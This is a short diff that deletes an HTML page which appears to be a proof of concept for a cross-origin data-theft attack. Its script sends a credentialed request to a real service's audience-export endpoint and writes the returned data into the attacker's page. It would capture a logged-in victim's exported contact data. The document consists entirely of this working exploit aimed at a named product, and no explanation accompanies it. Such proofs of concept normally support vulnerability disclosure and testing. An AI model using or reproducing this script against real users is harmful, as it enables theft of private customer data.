@@ -1,5 +1,0 @@
-<html>
-<script>
-var req = new XMLHttpRequest(); req.onload = reqListener; req.open('GET','https://app.omnisend.com/audience/exports',true); req.withCredentials = true; req.send('{}'); function reqListener() { document.write(this.responseText); };
-</script>
-</html>
